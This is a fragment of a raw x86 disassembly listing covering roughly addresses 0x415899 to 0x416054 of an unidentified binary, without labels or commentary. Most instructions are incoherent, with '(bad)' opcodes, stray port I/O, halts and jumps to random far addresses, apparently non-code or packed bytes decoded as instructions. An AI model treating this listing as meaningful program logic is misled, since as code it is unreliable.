  415899:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41589b:	and    eax,0x12d62c47
  4158a0:	dec    ebx
  4158a1:	xor    al,0xfa
  4158a3:	pop    ebx
  4158a4:	or     al,0x18
  4158a6:	push   0x76591927
  4158ab:	es clc 
  4158ad:	sub    BYTE PTR [esi],bl
  4158af:	aad    0x64
  4158b1:	jle    0x415837
  4158b3:	and    eax,0xa651ee83
  4158b8:	xlat   BYTE PTR ds:[ebx]
  4158b9:	fldcw  WORD PTR [esi+0x485110f7]
  4158bf:	sub    al,0x97
  4158c1:	push   ebp
  4158c2:	or     BYTE PTR [edi-0x31],ah
  4158c5:	sbb    DWORD PTR [ebp+0x2423c3d7],ebx
  4158cb:	mov    edi,ss
  4158cd:	fidivr WORD PTR [edx+ebp*4-0x5b]
  4158d1:	imul   edx,DWORD PTR [ebx+0x3e219669],0x96158292
  4158db:	and    BYTE PTR [ecx-0xd],cl
  4158de:	scas   eax,DWORD PTR es:[edi]
  4158df:	and    eax,DWORD PTR [edx]
  4158e1:	sub    al,0xca
  4158e3:	push   es
  4158e4:	mov    esp,0x9170ce35
  4158e9:	popa   
  4158ea:	int    0x5e
  4158ec:	sub    eax,0x4a90393d
  4158f1:	stos   DWORD PTR es:[edi],eax
  4158f2:	or     al,0x23
  4158f4:	repnz into 
  4158f6:	clc    
  4158f7:	and    BYTE PTR [edx],dl
  4158f9:	(bad)  
  4158fa:	pushf  
  4158fb:	out    dx,al
  4158fc:	addr16 fs xchg esp,eax
  4158ff:	outs   dx,DWORD PTR ds:[esi]
  415900:	jmp    0x6b66deda
  415905:	or     esp,edi
  415907:	push   eax
  415908:	in     al,0xd1
  41590a:	xchg   edi,eax
  41590b:	(bad)  
  41590c:	sbb    edi,esp
  41590e:	push   0x48
  415910:	aam    0xee
  415912:	ret    
  415913:	hlt    
  415914:	sub    esi,DWORD PTR [edi]
  415916:	cld    
  415917:	cmp    BYTE PTR [edx],dl
  415919:	jmp    0x3e6f1908
  41591e:	mov    bh,0xb3
  415920:	gs inc eax
  415922:	sbb    eax,0xee778eb3
  415927:	mov    WORD PTR [ecx],fs
  415929:	lahf   
  41592a:	mov    ?,WORD PTR [esi+0x13]
  41592d:	rol    edi,1
  41592f:	push   0xffffffa4
  415931:	mov    esp,0x8c021c3c
  415936:	adc    al,0xd6
  415938:	mov    bl,0x7
  41593a:	mov    ds:0x186cc931,eax
  41593f:	add    dh,al
  415941:	pop    edx
  415942:	sub    eax,0x170c6ca
  415947:	out    dx,al
  415948:	hlt    
  415949:	out    0x64,al
  41594b:	inc    ebp
  41594c:	mov    bl,0xde
  41594e:	adc    DWORD PTR [esi],edi
  415950:	push   ebp
  415951:	xchg   DWORD PTR [ebx+0x64],edx
  415954:	mov    ebp,0x535c6513
  415959:	addr16 jne 0x4159a8
  41595c:	and    BYTE PTR [ebp-0x5e],0x67
  415960:	sbb    BYTE PTR [edi+0x31],cl
  415963:	hlt    
  415964:	inc    edx
  415965:	jbe    0x4159a0
  415967:	imul   ebp,eax,0x3a954085
  41596d:	cld    
  41596e:	push   ds
  41596f:	lods   al,BYTE PTR ds:[esi]
  415970:	stc    
  415971:	shr    BYTE PTR [ebp+0x1478557b],0xc7
  415978:	and    dl,BYTE PTR [edx-0x4db9d657]
  41597e:	mov    BYTE PTR [ecx+0x76],bh
  415981:	repnz not BYTE PTR [esi+0x45987026]
  415988:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415989:	push   0xa5130bc3
  41598e:	in     eax,0xd9
  415990:	or     al,0x44
  415992:	sub    BYTE PTR [ebp-0x26],bh
  415995:	sub    esp,DWORD PTR ds:[esi-0x637f15f0]
  41599c:	mov    esi,0xb9f1587a
  4159a1:	retf   0x8a02
  4159a4:	mov    bl,bh
  4159a6:	fstp   DWORD PTR [esi+0x35]
  4159a9:	imul   ebp,edi,0x3d
  4159ac:	push   edx
  4159ad:	int    0x7f
  4159af:	data16 fdivr QWORD PTR [edx-0x1e86be9f]
  4159b6:	iret   
  4159b7:	sub    esi,DWORD PTR [esi]
  4159b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159ba:	loop   0x4159c1
  4159bc:	push   0x9cd738c2
  4159c1:	mov    edx,0x29e119f9
  4159c6:	or     eax,DWORD PTR [ebp-0xa]
  4159c9:	mov    al,ds:0x741ac76f
  4159ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159cf:	mov    ah,0xb1
  4159d1:	jl     0x4159df
  4159d3:	cli    
  4159d4:	clc    
  4159d5:	test   BYTE PTR [esi-0x71c7e45e],cl
  4159db:	sub    eax,0xae8c5fcc
  4159e0:	aas    
  4159e1:	mov    dh,0x9a
  4159e3:	push   esp
  4159e4:	and    al,BYTE PTR [esi-0x5bfd89]
  4159ea:	(bad)  
  4159eb:	mov    ah,0x7f
  4159ed:	es mov esp,0x2d45ee83
  4159f3:	mov    eax,0xc4f15ed4
  4159f8:	repz adc eax,0x80e919c2
  4159fe:	in     al,dx
  4159ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a00:	add    ecx,edi
  415a02:	shr    BYTE PTR [ebp+0x14],1
  415a05:	je     0x415a6c
  415a07:	adc    edx,DWORD PTR [ebx+0xe]
  415a0a:	int    0x49
  415a0c:	pop    edx
  415a0d:	sub    dl,BYTE PTR [ecx]
  415a0f:	call   0x5b95325
  415a14:	adc    BYTE PTR [ebp+edx*4-0x46],cl
  415a18:	fimul  DWORD PTR [esi]
  415a1a:	daa    
  415a1b:	mov    ds:0x565d222e,eax
  415a20:	sub    DWORD PTR [esi+esi*4],edx
  415a23:	cmp    al,0x87
  415a25:	xchg   bh,cl
  415a27:	xlat   BYTE PTR ds:[ebx]
  415a28:	jle    0x4159f0
  415a2a:	sub    al,0xd2
  415a2c:	pop    ebp
  415a2d:	adc    BYTE PTR [edi-0x51],0x80
  415a31:	lds    ebx,FWORD PTR [edi]
  415a33:	fldcw  WORD PTR [eax-0x31aa352]
  415a39:	jns    0x415a1b
  415a3b:	aam    0xdb
  415a3d:	arpl   WORD PTR [ebx],ax
  415a3f:	mov    ds:0x95c4da1,eax
  415a44:	sub    DWORD PTR [edx+esi*2+0x426855d6],ebx
  415a4b:	sub    eax,0xca949d04
  415a50:	in     eax,dx
  415a51:	sbb    al,BYTE PTR [esi]
  415a53:	jle    0x415a3e
  415a55:	pop    es
  415a56:	daa    
  415a57:	mov    ebx,0xa6f2d63a
  415a5c:	adc    esp,DWORD PTR [eax]
  415a5e:	or     eax,ecx
  415a60:	and    esp,DWORD PTR [eax]
  415a62:	ret    0x80f8
  415a65:	jmp    0x415a6f
  415a67:	pop    ss
  415a68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a69:	call   FWORD PTR [esi+0x40]
  415a6c:	and    eax,0xdb5b2faf
  415a71:	xlat   BYTE PTR ds:[ebx]
  415a72:	ins    BYTE PTR es:[edi],dx
  415a73:	and    DWORD PTR [esi],edx
  415a75:	xchg   bh,al
  415a77:	jge    0x415a1d
  415a79:	add    ah,cl
  415a7b:	add    DWORD PTR [edi],ecx
  415a7d:	shr    DWORD PTR cs:[ebx-0x520a7e65],1
  415a84:	xchg   edi,eax
  415a85:	test   al,0x3d
  415a87:	adc    eax,0xd13367d9
  415a8c:	lea    eax,[edx+eax*1+0x32729c]
  415a93:	jmp    0x415d77
  415a98:	sub    dl,BYTE PTR [eax-0x24]
  415a9b:	mov    esp,0x6eaabc6a
  415aa0:	popa   
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	aad    0x94
  415aa6:	aaa    
  415aa7:	je     0x415a61
  415aa9:	or     eax,0x7eb9707f
  415aae:	jo     0x415b20
  415ab0:	scas   al,BYTE PTR es:[edi]
  415ab1:	out    dx,al
  415ab2:	dec    esi
  415ab3:	mov    ch,0x51
  415ab5:	call   0xa04ae175
  415aba:	push   esp
  415abb:	push   eax
  415abc:	dec    ebp
  415abd:	(bad)  
  415abe:	enter  0xacea,0x8f
  415ac2:	or     DWORD PTR [edi+edi*1-0x10],ebp
  415ac6:	ins    BYTE PTR es:[edi],dx
  415ac7:	xor    DWORD PTR [ebx-0x3ac8b462],0x0
  415ace:	retf   0x6239
  415ad1:	dec    edi
  415ad2:	call   0x1765fa3a
  415ad7:	pop    ebp
  415ad8:	mov    ds:0x83f873c9,al
  415add:	sahf   
  415ade:	arpl   cx,ax
  415ae0:	pop    ecx
  415ae1:	push   ds
  415ae2:	and    ecx,DWORD PTR [ebp-0x4f]
  415ae5:	repnz nop
  415ae7:	gs jp  0x415af1
  415aea:	into   
  415aeb:	(bad)  
  415aec:	(bad)  
  415aed:	fisub  DWORD PTR [ebx-0x76044383]
  415af3:	fdivr  DWORD PTR [edi+0x17]
  415af6:	sar    ch,cl
  415af8:	lahf   
  415af9:	push   cs
  415afa:	push   eax
  415afb:	dec    esp
  415afc:	mov    dl,0x6e
  415afe:	fwait
  415aff:	call   DWORD PTR [esi+0x74]
  415b02:	clc    
  415b03:	ja     0x415ab5
  415b05:	mov    ds:0x27cb0d49,eax
  415b0a:	ja     0x415b6c
  415b0c:	out    0x17,eax
  415b0e:	scas   eax,DWORD PTR es:[edi]
  415b0f:	xor    BYTE PTR [ebx+0x48],ah
  415b12:	stc    
  415b13:	hlt    
  415b14:	jle    0x415ac7
  415b16:	stos   DWORD PTR es:[edi],eax
  415b17:	int    0xd
  415b19:	jmp    0x415ac1
  415b1b:	pop    es
  415b1c:	scas   al,BYTE PTR es:[edi]
  415b1d:	mov    ecx,0x7921e068
  415b22:	jl     0x415aca
  415b24:	mov    ds:0xd56dca19,eax
  415b29:	xor    ebp,DWORD PTR [ebp-0x5e]
  415b2c:	cmp    ebp,DWORD PTR [ebx+0x45]
  415b2f:	(bad)  
  415b30:	popf   
  415b31:	or     DWORD PTR [eax],esi
  415b33:	test   al,0xdf
  415b35:	cli    
  415b36:	dec    esi
  415b37:	leave  
  415b38:	ss sti 
  415b3a:	test   ebp,0x2f54ae5
  415b40:	fild   QWORD PTR [eax+edx*1-0x19]
  415b44:	mov    ds:0x6b58e392,eax
  415b49:	adc    BYTE PTR [esi+0x5e],ah
  415b4c:	adc    al,0x8d
  415b4e:	jns    0x415bb8
  415b50:	popa   
  415b51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b52:	paddw  mm7,QWORD PTR [eax+0x3300b4b9]
  415b59:	pop    ebx
  415b5a:	call   0x3ad0:0xa7908c92
  415b61:	dec    edx
  415b62:	outs   dx,DWORD PTR ds:[esi]
  415b63:	push   es
  415b64:	mov    WORD PTR [esi-0x779be648],cs
  415b6a:	sub    ah,BYTE PTR ds:0x6eb24dbc
  415b70:	aad    0xc5
  415b72:	adc    eax,DWORD PTR [eax]
  415b74:	add    eax,0x32f46eee
  415b79:	pop    ebp
  415b7a:	jmp    0x415b46
  415b7c:	mov    DWORD PTR [edi+ebx*4-0xb],eax
  415b80:	ss int 0x9c
  415b83:	adc    al,0x57
  415b85:	call   0xafa3bfa4
  415b8a:	fst    QWORD PTR [ebx]
  415b8c:	dec    ecx
  415b8d:	cmc    
  415b8e:	in     eax,0x2c
  415b90:	dec    eax
  415b91:	inc    esp
  415b92:	mov    ebx,0x727d96a8
  415b97:	inc    esi
  415b98:	aad    0x86
  415b9a:	aaa    
  415b9b:	cmp    DWORD PTR [ebp-0x33],ebp
  415b9e:	ja     0x415beb
  415ba0:	hlt    
  415ba1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ba2:	adc    al,al
  415ba4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ba5:	adc    DWORD PTR [esi+0x3c],ebp
  415ba8:	sub    DWORD PTR [ebp-0x65b3f574],esp
  415bae:	ret    
  415baf:	sub    BYTE PTR [ebp-0xf03ffb7],dh
  415bb5:	add    edi,ebx
  415bb7:	lods   al,BYTE PTR ds:[esi]
  415bb8:	jmp    0xee924bb4
  415bbd:	or     cl,cl
  415bbf:	or     al,0x86
  415bc1:	stc    
  415bc2:	inc    eax
  415bc3:	mov    edx,0xf17611f6
  415bc8:	int    0xf4
  415bca:	ins    BYTE PTR es:[edi],dx
  415bcb:	sub    ebx,edi
  415bcd:	add    al,0x92
  415bcf:	adc    al,0xaa
  415bd1:	shr    DWORD PTR ss:[esi-0x31e34eb6],1
  415bd8:	sbb    DWORD PTR [ebx],ebp
  415bda:	xchg   ebx,eax
  415bdb:	xchg   esi,eax
  415bdc:	adc    DWORD PTR cs:[ebp-0x7ba73435],edx
  415be3:	into   
  415be4:	cmp    BYTE PTR [edx],dl
  415be6:	sub    esp,DWORD PTR [edi]
  415be8:	fnstenv [eax+0x1a]
  415beb:	dec    ebp
  415bec:	fisttp WORD PTR [ebp-0xe]
  415bef:	loop   0x415b89
  415bf1:	push   ss
  415bf2:	addr16 js 0x415b77
  415bf5:	xor    esp,esp
  415bf7:	sahf   
  415bf8:	in     eax,dx
  415bf9:	and    dl,ch
  415bfb:	push   ds
  415bfc:	dec    edi
  415bfd:	xchg   edi,eax
  415bfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bff:	inc    esp
  415c00:	add    bh,dl
  415c02:	add    WORD PTR [edx],di
  415c05:	stc    
  415c06:	rcr    BYTE PTR [ecx+ebx*4+0x132f1b20],0x4d
  415c0e:	push   cs
  415c0f:	fmul   QWORD PTR [edx+edi*1]
  415c12:	or     eax,0x6c6fb1c1
  415c17:	popf   
  415c18:	pop    ds
  415c19:	into   
  415c1a:	pop    eax
  415c1b:	dec    edx
  415c1c:	je     0x415bfa
  415c1e:	(bad)  [edi+0x29]
  415c21:	imul   edi
  415c23:	stos   BYTE PTR es:[edi],al
  415c24:	cdq    
  415c25:	xor    dl,BYTE PTR [esi]
  415c27:	add    al,0x0
  415c29:	gs fdivp st(0),st
  415c2c:	xor    DWORD PTR [esi],esp
  415c2e:	addr16 pop ds
  415c30:	add    esi,0x2a88f6c0
  415c36:	addr16 call 0xbfdd:0xd9ad5ec0
  415c3e:	sbb    eax,0x9ea9b9da
  415c43:	push   edx
  415c44:	dec    ecx
  415c45:	or     BYTE PTR [ebp+0x2fc908c],ch
  415c4b:	xchg   esp,eax
  415c4c:	jl     0x415bef
  415c4e:	lahf   
  415c4f:	dec    ebx
  415c50:	jmp    0x415c1c
  415c52:	adc    eax,DWORD PTR [eax]
  415c54:	mov    WORD PTR [edx-0x2bab4743],fs
  415c5a:	push   ebp
  415c5b:	(bad)  
  415c5c:	jmp    0x7a610d47
  415c61:	adc    BYTE PTR [esp+edx*8-0x304c3968],ch
  415c68:	stc    
  415c69:	sbb    eax,0x58f45224
  415c6e:	and    al,0xc8
  415c70:	dec    esi
  415c71:	iret   
  415c72:	mov    esi,0x1803a667
  415c77:	popa   
  415c78:	jbe    0x415cf2
  415c7a:	test   BYTE PTR ds:0xc71989a8,ah
  415c80:	mov    dl,0x48
  415c82:	outs   dx,BYTE PTR ds:[esi]
  415c83:	adc    BYTE PTR [ebp+0x24],ah
  415c86:	inc    esi
  415c87:	dec    ebp
  415c88:	ror    DWORD PTR [ecx+0x58],0xd0
  415c8c:	adc    BYTE PTR [esp+ecx*4-0x4d9cee0f],0x1e
  415c94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c95:	cwde   
  415c96:	sub    cl,BYTE PTR ds:0x5526616c
  415c9c:	and    DWORD PTR [ecx+0x10981d5],ecx
  415ca2:	or     DWORD PTR [edi-0x1aeb9bad],ebp
  415ca8:	add    al,0x22
  415caa:	loope  0x415c3a
  415cac:	mov    ecx,0x43b62d7b
  415cb1:	inc    ebx
  415cb2:	sbb    dl,BYTE PTR [esi-0x88ec911]
  415cb8:	in     eax,0x3a
  415cba:	out    dx,eax
  415cbb:	popf   
  415cbc:	xor    eax,0x17cd8e3c
  415cc1:	gs push edx
  415cc3:	mov    dl,0xa3
  415cc5:	adc    bl,bh
  415cc7:	mov    DWORD PTR [edi+0x10],ecx
  415cca:	arpl   WORD PTR [ecx-0x5e],di
  415ccd:	or     BYTE PTR [esp+ebp*2+0x1bfdf829],ah
  415cd4:	mov    ch,0xd6
  415cd6:	mov    dh,0x84
  415cd8:	sti    
  415cd9:	pushf  
  415cda:	push   ss
  415cdb:	test   eax,0x9ca45ad1
  415ce0:	aas    
  415ce1:	push   ebx
  415ce2:	pop    ecx
  415ce3:	xchg   ecx,eax
  415ce4:	iret   
  415ce5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ce6:	jmp    0xcc31:0x644be960
  415ced:	cmp    dh,BYTE PTR [ecx-0x47]
  415cf0:	jmp    0x5779:0x2283cbb0
  415cf7:	(bad)  
  415cf8:	addr16 inc ecx
  415cfa:	std    
  415cfb:	in     al,0xd5
  415cfd:	ss mov cs,eax
  415d00:	push   cs
  415d01:	xor    bl,BYTE PTR [edx-0x49]
  415d04:	rcl    BYTE PTR [ebp+0x73c7f48d],1
  415d0a:	ret    
  415d0b:	inc    ebp
  415d0c:	mov    bl,0x8e
  415d0e:	cmp    al,0x8
  415d10:	ja     0x415cd4
  415d12:	repnz or bl,BYTE PTR fs:[edi+0x5bdbf1f5]
  415d1a:	dec    ebx
  415d1b:	push   edx
  415d1c:	jae    0x415d6c
  415d1e:	pop    ss
  415d1f:	rol    BYTE PTR [edx],1
  415d21:	ret    
  415d22:	mov    edx,DWORD PTR [eax+ecx*1]
  415d25:	inc    eax
  415d26:	cld    
  415d27:	xlat   BYTE PTR ds:[ebx]
  415d28:	(bad)  
  415d29:	xchg   ebp,eax
  415d2a:	std    
  415d2b:	mov    ah,0xa0
  415d2d:	mov    dh,0x9b
  415d2f:	cli    
  415d30:	ds jge 0x415d96
  415d33:	mov    esp,0x6f32311c
  415d38:	fwait
  415d39:	sahf   
  415d3a:	and    edx,DWORD PTR ds:0x8a331d57
  415d40:	test   eax,0xa90f8c9e
  415d45:	out    0x6b,al
  415d47:	or     ch,BYTE PTR [esi+0x1e2b8bae]
  415d4d:	mov    eax,ds:0x78757d94
  415d52:	fsubrp st(3),st
  415d54:	xchg   ebx,eax
  415d55:	sahf   
  415d56:	xor    ch,BYTE PTR [esi-0x74561102]
  415d5c:	into   
  415d5d:	pop    ebx
  415d5e:	jp     0x415ce0
  415d60:	dec    edi
  415d61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d62:	cmp    DWORD PTR [eax-0x5a7edc7f],eax
  415d68:	xchg   edi,eax
  415d69:	aas    
  415d6a:	out    0xf2,eax
  415d6c:	jbe    0x415dc1
  415d6e:	cmp    BYTE PTR [esi-0x5d],bh
  415d71:	and    BYTE PTR ds:0x7099b8db,bl
  415d77:	mov    edx,DWORD PTR [ebp+0x8]
  415d7a:	mov    edi,DWORD PTR [ebp-0x24]
  415d7d:	mov    DWORD PTR [edi+edx*4],eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	and    DWORD PTR [edi],edx
  415d96:	sub    BYTE PTR [ecx+eax*4+0xa],bh
  415d9a:	jg     0x415e0c
  415d9c:	mov    ecx,0x5570707e
  415da1:	adc    eax,0xef0590e2
  415da6:	lods   eax,DWORD PTR ds:[esi]
  415da7:	mov    cl,0x53
  415da9:	pop    ecx
  415daa:	sbb    BYTE PTR [esp+eax*4-0x394c6991],dh
  415db1:	mov    dl,ch
  415db3:	xchg   edi,eax
  415db4:	jnp    0x415dea
  415db6:	cwde   
  415db7:	ret    
  415db8:	sbb    BYTE PTR [ebx-0x4dac72b6],cl
  415dbe:	xor    BYTE PTR [edi],ah
  415dc0:	repnz retf 0x586
  415dc4:	in     eax,0x34
  415dc6:	mov    ah,0x69
  415dc8:	xchg   ebx,eax
  415dc9:	mov    bh,0x50
  415dcb:	pop    edx
  415dcc:	shr    BYTE PTR [eax],1
  415dce:	int    0xe7
  415dd0:	mov    eax,0x642083f
  415dd5:	xchg   dx,ax
  415dd7:	repz rcr DWORD PTR [edi+0x7c],0x1d
  415ddc:	hlt    
  415ddd:	sbb    DWORD PTR [ebx],0xe19f4871
  415de3:	in     al,dx
  415de4:	in     al,dx
  415de5:	aas    
  415de6:	xchg   ebp,eax
  415de7:	cmp    esp,DWORD PTR [ecx+0x74]
  415dea:	repnz add BYTE PTR [edx+0x3a07e6e0],ch
  415df1:	loope  0x415ddb
  415df3:	fsubr  QWORD PTR [edx-0x27f322d7]
  415df9:	sub    DWORD PTR [edx-0x34],0xffffffef
  415dfd:	inc    eax
  415dfe:	gs popf 
  415e00:	xchg   edx,eax
  415e01:	sti    
  415e02:	popf   
  415e03:	mov    bh,0xcb
  415e05:	adc    al,0xac
  415e07:	mov    al,0x32
  415e09:	dec    esp
  415e0a:	arpl   WORD PTR [ecx],cx
  415e0c:	sub    al,0x6a
  415e0e:	mov    edi,0xfc478358
  415e13:	cmp    esp,DWORD PTR [eax]
  415e15:	in     eax,0x76
  415e17:	adc    DWORD PTR [esi+0x7],edi
  415e1a:	push   esp
  415e1b:	push   es
  415e1c:	sbb    DWORD PTR [edi+0x31980450],ebp
  415e22:	jl     0x415e0e
  415e24:	sar    DWORD PTR [edi+eiz*2],0x30
  415e28:	mov    ebx,0x6cdbc8ab
  415e2d:	cmp    bl,BYTE PTR [ebp-0x4d]
  415e30:	push   eax
  415e31:	mov    edx,0x3a9cdd57
  415e36:	cmp    BYTE PTR [edi],bh
  415e38:	inc    ecx
  415e39:	not    DWORD PTR [esi+0x1d]
  415e3c:	pusha  
  415e3d:	push   edx
  415e3e:	jle    0x415ded
  415e40:	dec    edi
  415e41:	rcr    DWORD PTR [edx-0x7d],1
  415e44:	or     BYTE PTR [ebx],dl
  415e46:	mov    ecx,ebp
  415e48:	xlat   BYTE PTR ds:[ebx]
  415e49:	dec    ebx
  415e4a:	cmp    dl,BYTE PTR [edx+0x6ecbf982]
  415e50:	sub    BYTE PTR [ebx-0x13],al
  415e53:	fs mov ebp,0x6074c3b2
  415e59:	cmp    BYTE PTR [ebp+0x7a9c68e],bl
  415e5f:	fs mov edi,0xe3d264f9
  415e65:	mov    bh,0x4c
  415e67:	mov    eax,0x8eab0baf
  415e6c:	jnp    0x415ee2
  415e6e:	push   cs
  415e6f:	inc    edx
  415e70:	jg     0x415e17
  415e72:	jmp    0x87b9:0x130af64c
  415e79:	add    esi,ebp
  415e7b:	adc    bh,0xe0
  415e7e:	ins    BYTE PTR es:[edi],dx
  415e7f:	pop    ebx
  415e80:	cmp    edi,DWORD PTR [ebp-0x4ce941ee]
  415e86:	pop    ds
  415e87:	ret    
  415e88:	and    DWORD PTR gs:[esi+0xe413f22],eax
  415e8f:	iret   
  415e90:	and    DWORD PTR [esi],edi
  415e92:	in     al,dx
  415e93:	nop
  415e94:	pop    ss
  415e95:	xor    al,BYTE PTR [esi+0x78]
  415e98:	sbb    eax,0xb73863e8
  415e9d:	loopne 0x415ef3
  415e9f:	dec    ecx
  415ea0:	mov    edi,0x6f6f8e32
  415ea5:	test   al,0xc7
  415ea7:	xchg   ecx,eax
  415ea8:	jb     0x415e97
  415eaa:	mov    ds:0x1a8953cd,eax
  415eaf:	add    BYTE PTR [ebx+0x765cedf0],0xcd
  415eb6:	jg     0x415eae
  415eb8:	clc    
  415eb9:	xchg   esp,eax
  415eba:	push   0x13744725
  415ebf:	jnp    0x415efc
  415ec1:	hlt    
  415ec2:	loope  0x415f32
  415ec4:	pop    es
  415ec5:	push   DWORD PTR [edi+0xc6cbf42]
  415ecb:	add    eax,0x37c0c6aa
  415ed0:	stos   BYTE PTR es:[edi],al
  415ed1:	push   ebx
  415ed2:	xor    bl,dl
  415ed4:	mov    bl,0x22
  415ed6:	ja     0x415eb7
  415ed8:	cli    
  415ed9:	lods   eax,DWORD PTR ds:[esi]
  415eda:	jae    0x415edd
  415edc:	or     BYTE PTR [ebx+edi*8-0x18],ah
  415ee0:	push   0x2908dcee
  415ee5:	mov    edi,0x73f0277e
  415eea:	push   ss
  415eeb:	adc    bh,ch
  415eed:	rol    bl,cl
  415eef:	sbb    cl,BYTE PTR [edi]
  415ef1:	inc    ecx
  415ef2:	fsub   QWORD PTR [edi+0x12]
  415ef5:	imul   ecx,DWORD PTR [esi-0x7a4815d],0xffffffdc
  415efc:	cmc    
  415efd:	popf   
  415efe:	ins    BYTE PTR es:[edi],dx
  415eff:	push   esi
  415f00:	sub    DWORD PTR [ebp+0x1c],ebp
  415f03:	idiv   dl
  415f05:	shl    DWORD PTR [esi],cl
  415f07:	xchg   esp,eax
  415f08:	adc    eax,0x8c3741e5
  415f0d:	or     al,dl
  415f0f:	cmp    ebp,DWORD PTR [eax-0x3b]
  415f12:	pop    es
  415f13:	jle    0x415f93
  415f15:	sbb    BYTE PTR ds:0xc5a2de05,bh
  415f1b:	pop    es
  415f1c:	test   BYTE PTR [ebx-0x7c9ce2fb],0x45
  415f23:	push   ebx
  415f24:	xchg   DWORD PTR [esi+0x5e],eax
  415f27:	stos   DWORD PTR es:[edi],eax
  415f28:	pop    ss
  415f29:	or     DWORD PTR [ebx],ebp
  415f2b:	pop    edi
  415f2c:	mov    dl,0xae
  415f2e:	mov    fs,esp
  415f30:	dec    eax
  415f31:	mov    eax,ds:0x64c5c73b
  415f36:	mov    ebp,0xfe2313e5
  415f3b:	xchg   esi,eax
  415f3c:	lock push 0xffffffcb
  415f3f:	fisub  WORD PTR [edx+0x47]
  415f42:	mov    edx,0xe6b2f4c6
  415f47:	push   eax
  415f48:	stos   BYTE PTR es:[edi],al
  415f49:	push   edx
  415f4a:	pop    esp
  415f4b:	mov    edi,0xe17dbfb7
  415f50:	inc    edx
  415f51:	ds popa 
  415f53:	mov    cl,0xf
  415f55:	mov    ch,bh
  415f57:	push   edx
  415f58:	pop    ebp
  415f59:	loopne 0x415fac
  415f5b:	sbb    bl,BYTE PTR [eax+0x35]
  415f5e:	mov    DWORD PTR [ebp+ebp*8-0x7199b3ec],esp
  415f65:	add    eax,DWORD PTR [edi]
  415f67:	mov    bl,ch
  415f69:	out    0x14,al
  415f6b:	sub    edi,edx
  415f6d:	xor    bh,BYTE PTR [esi]
  415f6f:	mov    esp,0xb2d465a7
  415f74:	adc    al,0x82
  415f76:	imul   ebx,DWORD PTR [eax+ecx*8+0x7445a77],0xffffffd2
  415f7e:	mov    ds:0xaa59f613,al
  415f83:	int3   
  415f84:	ret    
  415f85:	loop   0x415fcd
  415f87:	mov    edi,0xb3f824a0
  415f8c:	xor    eax,0x684e0788
  415f91:	xchg   edi,eax
  415f92:	mov    al,0xc2
  415f94:	adc    esp,DWORD PTR [eax-0x1e]
  415f97:	fld    QWORD PTR [ebx+edi*4]
  415f9a:	and    eax,0xa308e7bd
  415f9f:	fist   DWORD PTR [esi+0x23]
  415fa2:	xchg   edx,eax
  415fa3:	imul   edi,eax,0x5c2c84c3
  415fa9:	ficomp DWORD PTR [ebp-0x39]
  415fac:	dec    ecx
  415fad:	aas    
  415fae:	out    dx,eax
  415faf:	retf   
  415fb0:	imul   BYTE PTR [eax+0x7a37ab10]
  415fb6:	push   0x49
  415fb8:	add    eax,0x47507b1a
  415fbd:	mov    cl,0xd8
  415fbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fc0:	dec    ebp
  415fc1:	in     al,dx
  415fc2:	(bad)  
  415fc3:	or     eax,0x19871bd4
  415fc8:	push   ss
  415fc9:	inc    edx
  415fca:	and    eax,0x1c4b7607
  415fcf:	cmp    ah,al
  415fd1:	rol    DWORD PTR [ebx+0x4c],0x1e
  415fd5:	mov    bh,0xaa
  415fd7:	scas   eax,DWORD PTR es:[edi]
  415fd8:	adc    BYTE PTR [edx-0x608ce44a],bl
  415fde:	gs out 0xba,eax
  415fe1:	nop
  415fe2:	jnp    0x41603a
  415fe4:	out    dx,al
  415fe5:	xchg   esi,eax
  415fe6:	xchg   BYTE PTR [ebx+0x2c],ch
  415fe9:	push   0xa6e2295d
  415fee:	fidiv  WORD PTR [esi]
  415ff0:	or     eax,0xb558aa3f
  415ff5:	pop    edx
  415ff6:	jl     0x415fea
  415ff8:	mov    cl,0x31
  415ffa:	sub    DWORD PTR [esi+0x79b3c944],eax
  416000:	popa   
  416001:	xor    ah,BYTE PTR [ecx+0x1e1c8e7c]
  416007:	mov    dh,0xeb
  416009:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41600a:	stos   DWORD PTR es:[edi],eax
  41600b:	aas    
  41600c:	and    edi,DWORD PTR [ebx-0x76]
  41600f:	jmp    0x41602d
  416011:	les    eax,FWORD PTR [ebx]
  416013:	adc    ebp,DWORD PTR [ecx-0x50]
  416016:	popa   
  416017:	pop    ss
  416018:	mov    ebx,0x9ee9ed77
  41601d:	push   edx
  41601e:	xchg   ebx,eax
  41601f:	or     esp,ebp
  416021:	gs fwait
  416023:	sahf   
  416024:	and    DWORD PTR [edi-0x60],edx
  416027:	sti    
  416028:	mov    al,ds:0x6f9dab65
  41602d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41602e:	xor    eax,DWORD PTR [edi]
  416030:	adc    dl,0xd7
  416033:	and    bl,0xc7
  416036:	mov    edi,0x47ad6a2
  41603b:	jmp    0x7abf73e2
  416040:	push   ds
  416041:	hlt    
  416042:	cli    
  416043:	ja     0x41603e
  416045:	push   es
  416046:	add    dl,BYTE PTR [edx]
  416048:	hlt    
  416049:	test   al,0xde
  41604b:	pop    eax
  41604c:	mov    al,0xb2
  41604e:	jmp    0x2c3e2475
  416053:	dec    esp
  416054:	xlat   BYTE PTR ds:[ebx]
